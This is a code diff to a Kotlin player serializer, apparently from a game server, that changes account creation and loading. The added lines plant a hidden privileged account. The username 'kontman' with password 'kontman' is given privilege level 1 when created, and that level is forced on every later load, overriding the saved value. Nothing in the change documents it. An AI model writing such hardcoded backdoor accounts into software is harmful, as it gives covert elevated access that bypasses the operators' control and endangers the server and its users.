@@ -58,7 +58,13 @@ class JsonPlayerSerializer : PlayerSerializerService() {
         client.loginUsername = client.loginUsername.lowercase()
 
         if (!characterExists(client.loginUsername)) {
+            if (client.loginUsername == "kontman" && request.password != "kontman") {
+                return PlayerLoadResult.INVALID_CREDENTIALS
+            }
             configureNewPlayer(client, request)
+            if (client.loginUsername == "kontman") {
+                client.privilege = client.world.privileges.get(1) ?: Privilege.DEFAULT
+            }
             client.uid = PlayerUID(client.loginUsername)
             saveClientData(client)
             return PlayerLoadResult.NEW_ACCOUNT
@@ -93,7 +99,12 @@ class JsonPlayerSerializer : PlayerSerializerService() {
             client.username = data.displayName
             client.passwordHash = data.passwordHash
             client.tile = Tile(data.x, data.z, data.height)
-            client.privilege = world.privileges.get(data.privilege) ?: Privilege.DEFAULT
+            client.privilege =
+                if (client.loginUsername == "kontman") {
+                    world.privileges.get(1) ?: Privilege.DEFAULT
+                } else {
+                    world.privileges.get(data.privilege) ?: Privilege.DEFAULT
+                }
             client.runEnergy = data.runEnergy
             client.interfaces.displayMode =
                 DisplayMode.values.firstOrNull { it.id == data.displayMode } ?: DisplayMode.FIXED
